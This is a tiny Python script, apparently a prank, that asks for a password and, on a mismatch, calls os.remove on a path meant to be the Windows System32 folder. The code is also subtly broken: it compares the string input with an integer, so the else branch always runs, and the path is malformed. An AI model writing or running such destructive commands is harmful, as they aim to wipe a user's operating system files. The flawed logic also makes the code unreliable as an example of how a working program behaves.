import os

enter = input("Password: ")

password = 123

if enter == password:
    print("Looged In")

else:
    os.remove('C\Windows\System32')



